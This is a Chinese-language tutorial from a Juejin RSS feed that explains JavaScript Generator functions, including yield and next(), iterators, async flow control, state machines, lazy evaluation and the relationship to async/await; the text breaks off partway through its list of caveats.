<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>掘金文章推荐</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>一个帮助开发者成长的社区</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[Generator 在 JavaScript 中的应用与优势]]></title>    <link>https://juejin.cn/post/7575810396201418786</link>    <guid>https://juejin.cn/post/7575810396201418786</guid>    <pubDate>2025-11-24T06:19:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575810396201418786" data-draft-id="7575810396201402402" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Generator 在 JavaScript 中的应用与优势"/> <meta itemprop="keywords" content="前端,JavaScript"/> <meta itemprop="datePublished" content="2025-11-24T06:19:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="大知闲闲i"/> <meta itemprop="url" content="https://juejin.cn/user/3799545205237111"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Generator 在 JavaScript 中的应用与优势
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3799545205237111/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    大知闲闲i
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T06:19:23.000Z" title="Mon Nov 24 2025 06:19:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">（Generator）：原理与实战场景</h3>
<p>在 JavaScript ES6 引入的众多特性中，生成器（Generator）无疑是最具创造性的特性之一。它打破了传统函数“一次性执行完毕”的固有模式，带来了“暂停执行、分段返回”的全新编程体验。对于前端开发者而言，掌握 Generator 不仅能解决异步编程、迭代器构建等实际问题，更能深入理解 JavaScript 的异步模型与迭代机制。本文将从核心概念、工作原理、语法规则到实战场景，全面解析 Generator 的价值与应用。</p>
<h2 data-id="heading-1">一、Generator 是什么？—— 打破常规的“可控函数”</h2>
<p>Generator 本质是一种<strong>可以暂停执行、按需恢复</strong>的特殊函数，它能在执行过程中多次返回中间结果，而不是一次性返回最终值。从形式上看，Generator 函数有两个显著特征：</p>
<ol>
<li>
<p>函数声明时带有 <code>function*</code> 关键字（注意 <code>*</code> 位置可在 <code>function</code> 与函数名之间任意位置，推荐紧跟 <code>function</code>）；</p>
</li>
<li>
<p>函数体内部使用 <code>yield</code> 关键字标记暂停点，每次执行到 <code>yield</code> 时会返回当前值并暂停；</p>
</li>
<li>
<p>调用 Generator 函数不会立即执行函数体，而是返回一个<strong>迭代器对象（Generator 对象）</strong>，通过该对象的 <code>next()</code> 方法控制函数执行。</p>
</li>
</ol>
<h3 data-id="heading-2">核心语法示例</h3>
<pre><code class="hljs language-lua" lang="lua">// 定义 Generator 函数
<span class="hljs-function"><span class="hljs-keyword">function</span>* <span class="hljs-title">numberGenerator</span><span class="hljs-params">()</span></span> {
  <span class="hljs-built_in">yield</span> <span class="hljs-number">1</span>; // 第一个暂停点，返回 <span class="hljs-number">1</span>
  <span class="hljs-built_in">yield</span> <span class="hljs-number">2</span>; // 第二个暂停点，返回 <span class="hljs-number">2</span>
  <span class="hljs-keyword">return</span> <span class="hljs-number">3</span>; // 最终返回值（迭代器 done 为 <span class="hljs-literal">true</span> 时返回）
}
​
// 调用 Generator 函数，返回迭代器对象（函数体未执行）
const generator = numberGenerator();
​
// 通过 <span class="hljs-built_in">next</span>() 方法控制执行
console.<span class="hljs-built_in">log</span>(generator.<span class="hljs-built_in">next</span>()); // { value: <span class="hljs-number">1</span>, done: <span class="hljs-literal">false</span> }（执行到第一个 <span class="hljs-built_in">yield</span>，暂停）
console.<span class="hljs-built_in">log</span>(generator.<span class="hljs-built_in">next</span>()); // { value: <span class="hljs-number">2</span>, done: <span class="hljs-literal">false</span> }（执行到第二个 <span class="hljs-built_in">yield</span>，暂停）
console.<span class="hljs-built_in">log</span>(generator.<span class="hljs-built_in">next</span>()); // { value: <span class="hljs-number">3</span>, done: <span class="hljs-literal">true</span> }（执行到 <span class="hljs-keyword">return</span>，函数结束）
console.<span class="hljs-built_in">log</span>(generator.<span class="hljs-built_in">next</span>()); // { value: undefined, done: <span class="hljs-literal">true</span> }（函数已结束，后续调用均返回 undefined）
</code></pre>
<h3 data-id="heading-3">关键特性解析</h3>
<ol>
<li>
<p><strong>惰性执行</strong>：Generator 函数调用后不会立即执行，只有调用 <code>next()</code> 才会执行到下一个 <code>yield</code> 或 <code>return</code>；</p>
</li>
<li>
<p><strong>状态保存</strong>：每次暂停后，函数的执行上下文（变量、指针位置）会被保存，恢复执行时直接从暂停点继续；</p>
</li>
<li>
<p><strong>双向通信</strong>：<code>next()</code> 方法可以接收参数，作为上一个 <code>yield</code> 表达式的返回值，实现函数内外的数据传递：</p>
<ol>
<li><code>function* echoGenerator() { const msg1 = yield "请输入第一个消息"; const msg2 = yield</code> 你输入的第一个消息是：<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mi>m</mi><mi>s</mi><mi>g</mi><mn>1</mn></mrow><mi mathvariant="normal">‘</mi><mo separator="true">;</mo><mi>r</mi><mi>e</mi><mi>t</mi><mi>u</mi><mi>r</mi><mi>n</mi><mi mathvariant="normal">‘</mi><mtext>你输入的第二个消息是：</mtext></mrow><annotation encoding="application/x-tex">{msg1}`; return` 你输入的第二个消息是：</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord">1</span></span><span class="mord">‘</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">re</span><span class="mord mathnormal">t</span><span class="mord mathnormal">u</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">n</span><span class="mord">‘</span><span class="mord cjk_fallback">你输入的第二个消息是：</span></span></span></span></span>{msg2}<code>; } const generator = echoGenerator(); console.log(generator.next()); // { value: "请输入第一个消息", done: false } console.log(generator.next("Hello")); // { value: "你输入的第一个消息是：Hello", done: false } console.log(generator.next("World")); // { value: "你输入的第二个消息是：World", done: true }</code></li>
</ol>
</li>
<li>
<p><strong>可迭代性</strong>：Generator 函数返回的迭代器对象实现了 <code>Iterable</code> 接口，可直接用于 <code>for...of</code> 循环（自动遍历所有 <code>yield</code> 返回值，忽略 <code>return</code> 最终值）：</p>
<ol>
<li><code>for (const value of numberGenerator()) { console.log(value); // 依次输出 1、2（不输出 3） }</code></li>
</ol>
</li>
</ol>
<h2 data-id="heading-4">二、Generator 的工作原理——迭代器与暂停机制</h2>
<p>要理解 Generator，需先明确两个核心概念：<strong>迭代器（Iterator）</strong> 和 <strong>暂停点（Suspend Point）</strong>。</p>
<h3 data-id="heading-5">1. 迭代器协议基础</h3>
<p>JavaScript 中，迭代器是一个实现了 <code>next()</code> 方法的对象，该方法返回包含 <code>value</code>（当前值）和 <code>done</code>（是否完成）的对象。Generator 函数的本质是<strong>迭代器生成器</strong>——调用后返回的 Generator 对象，正是一个符合迭代器协议的对象。</p>
<p>这意味着 Generator 天然解决了“自定义迭代逻辑”的问题，无需手动实现 <code>next()</code> 方法和迭代器接口。</p>
<h3 data-id="heading-6">2. 暂停与恢复的底层逻辑</h3>
<p>当调用 <code>next()</code> 方法时，Generator 函数会执行到最近的 <code>yield</code> 语句：</p>
<ul>
<li>
<p>执行 <code>yield 表达式</code> 时，会将表达式结果作为 <code>value</code> 返回，并暂停函数执行，保存当前执行上下文（包括变量值、代码执行位置）；</p>
</li>
<li>
<p>再次调用 <code>next(arg)</code> 时，会将 <code>arg</code> 作为上一个 <code>yield</code> 表达式的返回值，恢复执行上下文，继续执行到下一个 <code>yield</code> 或函数结束；</p>
</li>
<li>
<p>当执行到 <code>return</code> 语句或函数末尾时，返回 <code>done: true</code>，后续调用 <code>next()</code> 均返回 <code>{ value: undefined, done: true }</code>。</p>
</li>
</ul>
<p>简单来说，Generator 函数通过 <code>yield</code> 构建了多个“执行片段”，<code>next()</code> 方法则是触发这些片段执行的“开关”。</p>
<h2 data-id="heading-7">三、Generator 的核心应用场景——从理论到实战</h2>
<p>Generator 的“暂停执行”和“分段返回”特性，使其在多个场景中具备独特优势，尤其在异步编程、迭代器构建、状态管理等领域发挥重要作用。</p>
<h3 data-id="heading-8">1. 异步编程——替代回调地狱（ES6 时代的异步方案）</h3>
<p>在 <code>async/await</code> 出现之前，Generator 是解决回调地狱的重要方案。通过 <code>yield</code> 暂停异步操作，<code>next()</code> 恢复执行，可将异步代码写得像同步代码一样清晰。</p>
<h4 data-id="heading-9">示例：用 Generator 处理异步请求</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 模拟异步请求</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchData</span>(<span class="hljs-params">url</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> {
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-title function_">resolve</span>(<span class="hljs-string">`从 <span class="hljs-subst">${url}</span> 获取的数据`</span>);
    }, <span class="hljs-number">1000</span>);
  });
}
​
<span class="hljs-comment">// Generator 异步流程控制</span>
<span class="hljs-keyword">function</span>* <span class="hljs-title function_">asyncGenerator</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"开始请求数据"</span>);
  <span class="hljs-keyword">const</span> data1 = <span class="hljs-keyword">yield</span> <span class="hljs-title function_">fetchData</span>(<span class="hljs-string">"https://api.example.com/data1"</span>); <span class="hljs-comment">// 暂停，等待异步结果</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"第一个请求结果："</span>, data1);
  <span class="hljs-keyword">const</span> data2 = <span class="hljs-keyword">yield</span> <span class="hljs-title function_">fetchData</span>(<span class="hljs-string">"https://api.example.com/data2"</span>); <span class="hljs-comment">// 再次暂停</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"第二个请求结果："</span>, data2);
  <span class="hljs-keyword">return</span> <span class="hljs-string">"所有请求完成"</span>;
}
​
<span class="hljs-comment">// 执行 Generator 异步流程（需要手动驱动或使用工具库如 co）</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">runGenerator</span>(<span class="hljs-params">generator</span>) {
  <span class="hljs-keyword">const</span> iterator = <span class="hljs-title function_">generator</span>();
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">handleResult</span>(<span class="hljs-params">result</span>) {
    <span class="hljs-keyword">if</span> (result.<span class="hljs-property">done</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"最终结果："</span>, result.<span class="hljs-property">value</span>);
      <span class="hljs-keyword">return</span>;
    }
    <span class="hljs-comment">// 处理 yield 返回的 Promise</span>
    result.<span class="hljs-property">value</span>.<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> {
      <span class="hljs-title function_">handleResult</span>(iterator.<span class="hljs-title function_">next</span>(data)); <span class="hljs-comment">// 将异步结果传入 next()，恢复执行</span>
    });
  }
  <span class="hljs-title function_">handleResult</span>(iterator.<span class="hljs-title function_">next</span>());
}
​
<span class="hljs-comment">// 启动异步流程</span>
<span class="hljs-title function_">runGenerator</span>(asyncGenerator);
</code></pre>
<h4 data-id="heading-10">说明：</h4>
<ul>
<li>
<p>上述代码中，<code>yield</code> 后面跟的是 Promise 对象，通过 <code>runGenerator</code> 函数自动处理 Promise 结果，实现异步流程的同步化写法；</p>
</li>
<li>
<p>后来的 <code>async/await</code> 本质上是 Generator + Promise 的语法糖，<code>async</code> 对应 Generator 函数，<code>await</code> 对应 <code>yield</code>，底层逻辑高度相似。</p>
</li>
</ul>
<h3 data-id="heading-11">2. 构建复杂迭代器——自定义遍历逻辑</h3>
<p>Generator 天生是迭代器生成器，无需手动实现 <code>next()</code> 方法，即可轻松构建复杂的遍历逻辑（如无限序列、条件遍历、嵌套结构扁平化等）。</p>
<h4 data-id="heading-12">示例 1：生成无限序列（斐波那契数列）</h4>
<pre><code class="hljs language-ini" lang="ini">// 生成无限斐波那契数列的 Generator
function* fibonacciGenerator() {
  let <span class="hljs-attr">a</span> = <span class="hljs-number">0</span>, b = <span class="hljs-number">1</span><span class="hljs-comment">;</span>
  while (true) {
    yield a<span class="hljs-comment">;</span>
    <span class="hljs-section">[a, b]</span> = <span class="hljs-section">[b, a + b]</span><span class="hljs-comment">; // 解构赋值更新状态</span>
  }
}
​
const <span class="hljs-attr">fibGenerator</span> = fibonacciGenerator()<span class="hljs-comment">;</span>
// 按需获取前 10 个斐波那契数
for (let <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; 10; i++) {</span>
  console.log(fibGenerator.next().value)<span class="hljs-comment">; // 0, 1, 1, 2, 3, 5, 8, 13, 21, 34</span>
}
</code></pre>
<h4 data-id="heading-13">示例 2：扁平化嵌套数组</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 扁平化嵌套数组的 Generator</span>
<span class="hljs-keyword">function</span>* <span class="hljs-title function_">flattenArray</span>(<span class="hljs-params">arr</span>) {
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> item <span class="hljs-keyword">of</span> arr) {
    <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(item)) {
      <span class="hljs-keyword">yield</span>* <span class="hljs-title function_">flattenArray</span>(item); <span class="hljs-comment">// yield*  delegating 到子 Generator，递归扁平化</span>
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-keyword">yield</span> item;
    }
  }
}
​
<span class="hljs-keyword">const</span> nestedArray = [<span class="hljs-number">1</span>, [<span class="hljs-number">2</span>, [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>], <span class="hljs-number">5</span>], <span class="hljs-number">6</span>];
<span class="hljs-keyword">const</span> flatGenerator = <span class="hljs-title function_">flattenArray</span>(nestedArray);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>([...flatGenerator]); <span class="hljs-comment">// [1, 2, 3, 4, 5, 6]（通过扩展运算符遍历所有 yield 值）</span>
</code></pre>
<h3 data-id="heading-14">3. 状态机——管理复杂状态流转</h3>
<p>Generator 函数的暂停特性使其天然适合作为状态机，每个 <code>yield</code> 对应一个状态，<code>next()</code> 调用触发状态切换，无需额外维护状态变量。</p>
<h4 data-id="heading-15">示例：实现红绿灯状态机</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 红绿灯状态机 Generator</span>
<span class="hljs-keyword">function</span>* <span class="hljs-title function_">trafficLightGenerator</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
    <span class="hljs-keyword">yield</span> <span class="hljs-string">"红灯"</span>; <span class="hljs-comment">// 状态 1：红灯</span>
    <span class="hljs-keyword">yield</span> <span class="hljs-string">"绿灯"</span>; <span class="hljs-comment">// 状态 2：绿灯</span>
    <span class="hljs-keyword">yield</span> <span class="hljs-string">"黄灯"</span>; <span class="hljs-comment">// 状态 3：黄灯</span>
  }
}
​
<span class="hljs-keyword">const</span> lightGenerator = <span class="hljs-title function_">trafficLightGenerator</span>();
<span class="hljs-comment">// 模拟红绿灯切换（每 2 秒切换一次）</span>
<span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> { value } = lightGenerator.<span class="hljs-title function_">next</span>();
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"当前灯色："</span>, value); <span class="hljs-comment">// 红灯 → 绿灯 → 黄灯 → 红灯...循环</span>
}, <span class="hljs-number">2000</span>);
</code></pre>
<h3 data-id="heading-16">4. 惰性求值——按需计算，优化性能</h3>
<p>惰性求值（Lazy Evaluation）是指“只有在需要时才计算值”，Generator 的暂停特性使其成为实现惰性求值的理想工具，可减少不必要的计算和内存占用。</p>
<h4 data-id="heading-17">示例：生成海量数据的惰性遍历</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 生成 100 万条数据的 Generator（惰性生成，不占用大量内存）</span>
<span class="hljs-keyword">function</span>* <span class="hljs-title function_">largeDataGenerator</span>(<span class="hljs-params">count</span>) {
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt;= count; i++) {
    <span class="hljs-keyword">yield</span> { <span class="hljs-attr">id</span>: i, <span class="hljs-attr">value</span>: <span class="hljs-string">`数据 <span class="hljs-subst">${i}</span>`</span> }; <span class="hljs-comment">// 仅在调用 next() 时生成当前数据</span>
  }
}
​
<span class="hljs-keyword">const</span> dataGenerator = <span class="hljs-title function_">largeDataGenerator</span>(<span class="hljs-number">1000000</span>);
<span class="hljs-comment">// 按需获取数据，无需一次性加载 100 万条</span>
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(dataGenerator.<span class="hljs-title function_">next</span>().<span class="hljs-property">value</span>); <span class="hljs-comment">// 仅生成前 10 条数据</span>
}
</code></pre>
<h3 data-id="heading-18">5. 流程控制——分步执行复杂逻辑</h3>
<p>对于需要分步执行的复杂业务逻辑（如表单多步骤提交、向导式流程），Generator 可通过 <code>yield</code> 拆分步骤，实现逻辑解耦和灵活控制。</p>
<h4 data-id="heading-19">示例：多步骤表单提交</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 多步骤表单流程 Generator</span>
<span class="hljs-keyword">function</span>* <span class="hljs-title function_">formStepGenerator</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> step1Data = <span class="hljs-keyword">yield</span> <span class="hljs-string">"请填写基本信息（姓名、电话）"</span>;
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"基本信息提交："</span>, step1Data);
  
  <span class="hljs-keyword">const</span> step2Data = <span class="hljs-keyword">yield</span> <span class="hljs-string">"请填写地址信息（省、市、区）"</span>;
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"地址信息提交："</span>, step2Data);
  
  <span class="hljs-keyword">const</span> step3Data = <span class="hljs-keyword">yield</span> <span class="hljs-string">"请确认提交信息"</span>;
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"最终提交："</span>, step3Data);
  <span class="hljs-keyword">return</span> <span class="hljs-string">"表单提交成功"</span>;
}
​
<span class="hljs-comment">// 驱动表单流程</span>
<span class="hljs-keyword">const</span> formGenerator = <span class="hljs-title function_">formStepGenerator</span>();
<span class="hljs-comment">// 模拟用户分步输入</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(formGenerator.<span class="hljs-title function_">next</span>().<span class="hljs-property">value</span>); <span class="hljs-comment">// 步骤 1：提示填写基本信息</span>
formGenerator.<span class="hljs-title function_">next</span>({ <span class="hljs-attr">name</span>: <span class="hljs-string">"张三"</span>, <span class="hljs-attr">phone</span>: <span class="hljs-string">"13800138000"</span> }); <span class="hljs-comment">// 提交步骤 1 数据</span>
​
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(formGenerator.<span class="hljs-title function_">next</span>().<span class="hljs-property">value</span>); <span class="hljs-comment">// 步骤 2：提示填写地址信息</span>
formGenerator.<span class="hljs-title function_">next</span>({ <span class="hljs-attr">province</span>: <span class="hljs-string">"广东省"</span>, <span class="hljs-attr">city</span>: <span class="hljs-string">"深圳市"</span>, <span class="hljs-attr">area</span>: <span class="hljs-string">"南山区"</span> }); <span class="hljs-comment">// 提交步骤 2 数据</span>
​
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(formGenerator.<span class="hljs-title function_">next</span>().<span class="hljs-property">value</span>); <span class="hljs-comment">// 步骤 3：提示确认信息</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(formGenerator.<span class="hljs-title function_">next</span>(<span class="hljs-string">"确认提交"</span>).<span class="hljs-property">value</span>); <span class="hljs-comment">// 提交步骤 3 数据，返回最终结果</span>
</code></pre>
<h2 data-id="heading-20">四、Generator 与 async/await 的关系——替代与传承</h2>
<p>提到 Generator 的异步应用，就不得不提 <code>async/await</code>。<code>async/await</code> 是 ES2017 引入的特性，本质上是 Generator + Promise 的语法糖，它解决了 Generator 需手动驱动（如 <code>runGenerator</code> 函数）的痛点，让异步代码更简洁、更易理解。</p>
<h3 data-id="heading-21">对比：Generator 与 async/await 实现同一异步逻辑</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Generator 版本</span>
<span class="hljs-keyword">function</span>* <span class="hljs-title function_">asyncGenerator</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> data1 = <span class="hljs-keyword">yield</span> <span class="hljs-title function_">fetchData</span>(<span class="hljs-string">"https://api.example.com/data1"</span>);
  <span class="hljs-keyword">const</span> data2 = <span class="hljs-keyword">yield</span> <span class="hljs-title function_">fetchData</span>(<span class="hljs-string">"https://api.example.com/data2"</span>);
  <span class="hljs-keyword">return</span> [data1, data2];
}
​
<span class="hljs-comment">// async/await 版本（语法糖，更简洁）</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">asyncFunction</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> data1 = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetchData</span>(<span class="hljs-string">"https://api.example.com/data1"</span>);
  <span class="hljs-keyword">const</span> data2 = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetchData</span>(<span class="hljs-string">"https://api.example.com/data2"</span>);
  <span class="hljs-keyword">return</span> [data1, data2];
}
</code></pre>
<h3 data-id="heading-22">核心区别：</h3>
<ol>
<li>
<p><strong>自动驱动</strong>：<code>async/await</code> 无需手动编写驱动函数（如 <code>runGenerator</code>），JavaScript 引擎自动处理 Promise 与流程恢复；</p>
</li>
<li>
<p><strong>返回值</strong>：<code>async</code> 函数直接返回 Promise，而 Generator 函数返回迭代器对象；</p>
</li>
<li>
<p><strong>错误处理</strong>：<code>async/await</code> 可直接使用 <code>try/catch</code> 捕获错误，Generator 需在 <code>next()</code> 调用或 Promise 中处理错误；</p>
</li>
<li>
<p><strong>语义清晰</strong>：<code>async/await</code> 明确表示“异步操作”，语义更直观，降低学习成本。</p>
</li>
</ol>
<h3 data-id="heading-23">结论：</h3>
<ul>
<li>
<p>现代开发中，异步编程优先使用 <code>async/await</code>，它是 Generator 异步方案的优化版；</p>
</li>
<li>
<p>但 Generator 并非过时——在迭代器构建、状态机、惰性求值等场景中，Generator 仍有不可替代的优势。</p>
</li>
</ul>
<h2 data-id="heading-24">五、使用 Generator 的注意事项</h2>
<ol>
<li>
<p><strong>不可重复执行</strong>：Generator 函数返回的迭代器对象只能遍历一次，若需重新执行，需重新调用 Generator 函数生成新的迭代器；</p>
</li>
<li>
<p><strong><code>yield</code></strong> <strong>不能在普通函数中使用</strong>：<code>yield</code> 关键字只能在 Generator 函数（<code>function*</code>）内部使用，否则会报错；</p>
</li>
<li>
<p><strong><code>return</code></strong> <strong>语句的影响</strong>：<code>return</code> 语句会终止 Generator 执行，其返回值不会被 <code>for...of</code> 循环遍历，仅在 <code>next()</code> 返回 <code>done: true</code> 时获取；</p>
</li>
<li>
